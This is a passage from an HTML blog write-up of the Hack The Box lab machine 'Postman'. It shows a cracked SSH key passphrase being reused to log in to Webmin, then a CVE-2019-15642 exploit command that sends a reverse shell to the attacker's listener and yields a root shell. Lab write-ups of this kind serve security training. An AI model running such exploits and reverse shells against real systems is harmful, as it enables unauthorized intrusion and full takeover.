+</span></span><span class=line><span class=cl>Warning: detected <span class=nb>hash</span> <span class=nb>type</span> <span class=s2>&#34;SSH&#34;</span>, but the string is also recognized as <span class=s2>&#34;ssh-opencl&#34;</span>
+</span></span><span class=line><span class=cl>Using default input encoding: UTF-8
+</span></span><span class=line><span class=cl>Loaded <span class=m>1</span> password <span class=nb>hash</span> <span class=o>(</span>SSH <span class=o>[</span>RSA/DSA/EC/OPENSSH <span class=o>(</span>SSH private keys<span class=o>)</span> 32/64<span class=o>])</span>
+</span></span><span class=line><span class=cl>Cost <span class=m>1</span> <span class=o>(</span>KDF/cipher <span class=o>[</span><span class=nv>0</span><span class=o>=</span>MD5/AES <span class=nv>1</span><span class=o>=</span>MD5/3DES <span class=nv>2</span><span class=o>=</span>Bcrypt/AES<span class=o>])</span> is <span class=m>1</span> <span class=k>for</span> all loaded hashes
+</span></span><span class=line><span class=cl>Cost <span class=m>2</span> <span class=o>(</span>iteration count<span class=o>)</span> is <span class=m>2</span> <span class=k>for</span> all loaded hashes
+</span></span><span class=line><span class=cl>Will run <span class=m>20</span> OpenMP threads
+</span></span><span class=line><span class=cl>Note: This format may emit <span class=nb>false</span> positives, so it will keep trying even after
+</span></span><span class=line><span class=cl>finding a possible candidate.
+</span></span><span class=line><span class=cl>computer2008     <span class=o>(</span>matt.bak<span class=o>)</span>
+</span></span></code></pre></div><p>Passphrase: <code>computer2008</code>. This is presumably Matt&rsquo;s key given the filename and the fact that Matt is the only user. Trying SSH with the key:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>…/labs/postman ✗ ssh -i matt.bak Matt@postman.htb
+</span></span><span class=line><span class=cl>Enter passphrase <span class=k>for</span> key <span class=s1>&#39;matt.bak&#39;</span>: 
+</span></span><span class=line><span class=cl>Connection closed by 10.129.18.102 port <span class=m>22</span>
+</span></span></code></pre></div><p>SSH rejected it. The key is valid but Matt&rsquo;s account has SSH access disabled or the authorized_keys doesn&rsquo;t match. One other option: try <code>computer2008</code> as Matt&rsquo;s password on Webmin.</p><h2 id=cve-2019-15642-webmin-rce>CVE-2019-15642: Webmin RCE</h2><p><img src=/images/writeups/htb-postman/web-webmin-login.png alt="Webmin 1.910 login page at port 10000"></p><p><code>Matt:computer2008</code> worked:</p><p><img src=/images/writeups/htb-postman/web-webmin-matt-dashboard.png alt="Webmin dashboard logged in as Matt showing Software Package Updates panel with 181 packages"></p><p>Logged in as Matt on Webmin 1.910. CVE-2019-15642 is an authenticated RCE in this version. The vulnerability is in a Perl eval in the package update functionality that doesn&rsquo;t sanitize its input, allowing arbitrary code execution under the account running Webmin, which is root. The original PoC was Python 2, so I ported it to Python 3 and adjusted it to trigger a reverse shell directly:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>…/labs/postman ✗ python3 webmin_exploit_py3.py --rhost postman.htb --lhost 10.10.16.129 --lport <span class=m>9999</span> -u Matt -p computer2008
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Webmin 1.910 RCE - CVE-2019-15642
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Target: https://postman.htb:10000/
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Auth: Matt:computer2008
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Authenticating...
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Got session ID: 13fa100fa711edabd027472b22c5d6e4
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending payload -&gt; 10.10.16.129:9999
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Payload sent! Check your listener on port <span class=m>9999</span>
+</span></span><span class=line><span class=cl>    nc -lvnp <span class=m>9999</span>
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>…/labs/postman ✗ nc -lvnp <span class=m>9999</span>
+</span></span><span class=line><span class=cl>Listening on 0.0.0.0 <span class=m>9999</span>
+</span></span><span class=line><span class=cl>Connection received on 10.129.18.102 <span class=m>39388</span>
+</span></span><span class=line><span class=cl>id
+</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span>
+</span></span></code></pre></div><p>Root. No intermediate step from Matt to root. Webmin runs as root, the RCE runs as root, that&rsquo;s it. Root flag.</p><p>The credential reuse between the SSH key passphrase and the Webmin login is the connection that makes this box work. It&rsquo;s easy to give up on Webmin after the initial nmap scan when you don&rsquo;t have creds yet. The Redis foothold and the backup key are the nudge to come back and try it. Password reuse on admin panels is extremely common in real environments, which is part of why this pattern shows up so often on HTB.</p></div></article></main></div><script>function toggleToc(){const e=document.getElementById("tocContent"),t=document.querySelector(".toc-toggle");if(!e||!t)return;e.classList.toggle("expanded"),t.classList.toggle("expanded")}function toggleMiniToc(){const e=document.getElementById("miniToc");e&&e.classList.toggle("minimized")}function setupActiveHighlighting(e){const n=Array.from(e).map(e=>{const t=e.getAttribute("href");if(t&&t.startsWith("#")){const n=document.getElementById(decodeURIComponent(t.slice(1)));if(n)return{link:e,element:n}}return null}).filter(Boolean);if(n.length===0)return;function s(){const s=window.scrollY+100;let t=null;n.forEach(e=>{e.element.offsetTop<=s&&(t=e)}),e.forEach(e=>e.classList.remove("active")),t&&t.link.classList.add("active")}let t=!1;window.addEventListener("scroll",()=>{t||(requestAnimationFrame(()=>{s(),t=!1}),t=!0)}),s()}function initMiniToc(){const n=document.getElementById("miniToc"),s=document.getElementById("miniTocContent"),o=document.getElementById("tocContent");if(!n||!s||!o)return;const e=o.cloneNode(!0);e.classList.remove("toc-content","expanded"),e.removeAttribute("id");const t=e.querySelectorAll("a");if(t.length===0)return;t.forEach(e=>{e.addEventListener("click",t=>{const n=e.getAttribute("href");if(n&&n.startsWith("#")){const e=document.getElementById(decodeURIComponent(n.slice(1)));e&&(t.preventDefault(),e.scrollIntoView({behavior:"smooth",block:"start"}),history.pushState(null,"",n))}})}),s.appendChild(e),n.classList.add("visible"),setupActiveHighlighting(t)}document.addEventListener("DOMContentLoaded",initMiniToc)</script><footer class=footer><span class=footer_item></span>&nbsp;<div class=footer_social-icons><a href=https://discord.com/users/kanyo._ target=_blank rel="noopener noreferrer me" title=Discord><svg viewBox="20 15 205 190" fill="currentColor" stroke="none"><path d="M104.4 103.9c-5.7.0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7.0 10.2-5 10.2-11.1.1-6.1-4.5-11.1-10.2-11.1zm36.5.0c-5.7.0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7.0 10.2-5 10.2-11.1s-4.5-11.1-10.2-11.1z"/><path d="M189.5 20h-134C44.2 20 35 29.2 35 40.6v135.2c0 11.4 9.2 20.6 20.5 20.6h113.4l-5.3-18.5 12.8 11.9 12.1 11.2 21.5 19V40.6c0-11.4-9.2-20.6-20.5-20.6zm-38.6 130.6s-3.6-4.3-6.6-8.1c13.1-3.7 18.1-11.9 18.1-11.9-4.1 2.7-8 4.6-11.5 5.9-5 2.1-9.8 3.5-14.5 4.3-9.6 1.8-18.4 1.3-25.9-.1-5.7-1.1-10.6-2.7-14.7-4.3-2.3-.9-4.8-2-7.3-3.4-.3-.2-.6-.3-.9-.5-.2-.1-.3-.2-.4-.3-1.8-1-2.8-1.7-2.8-1.7s4.8 8 17.5 11.8c-3 3.8-6.7 8.3-6.7 8.3-22.1-.7-30.5-15.2-30.5-15.2.0-32.2 14.4-58.3 14.4-58.3 14.4-10.8 28.1-10.5 28.1-10.5l1 1.2c-18 5.2-26.3 13.1-26.3 13.1s2.2-1.2 5.9-2.9c10.7-4.7 19.2-6 22.7-6.3.6-.1 1.1-.2 1.7-.2 6.1-.8 13-1 20.2-.2 9.5 1.1 19.7 3.9 30.1 9.6.0.0-7.9-7.5-24.9-12.7l1.4-1.6s13.7-.3 28.1 10.5c0 0 14.4 26.1 14.4 58.3.0.0-8.5 14.5-30.6 15.2z"/></svg></a>
+<a href=https://github.com/Chaelsoo target=_blank rel="noopener noreferrer me" title=Github><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a>
+<a href=https://www.linkedin.com/in/abderrahmen-dellaa-a78517249/ target=_blank rel="noopener noreferrer me" title=Linkedin><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-2-2 2 2 0 00-2 2v7h-4v-7a6 6 0 016-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg></a>
+<a href=https://app.hackthebox.com/users/1490281 target=_blank rel="noopener noreferrer me" title=Hackthebox><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 1 2 6.5v11L12 23l10-5.5v-11L12 1z"/><path d="M12 12 2 6.5M12 12v11m0-11 10-5.5"/></svg></a></div><small class=footer_copyright>© 2026 .
+Powered by <a href=https://github.com/hugo-sid/hugo-blog-awesome target=_blank rel=noopener>Hugo blog awesome</a>.</small></footer><a href=# title="Go to top" id=totop><svg width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960"><path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197z"/></svg>
+</a><script src=https://chaelsoo.me/js/main.min.b09c6387b2f6ee79fac79c531b410d511da72f67534abd4435676936738db1e1.js integrity="sha256-sJxjh7L27nn6x5xTG0ENUR2nL2dTSr1ENWdpNnONseE="></script></body></html>
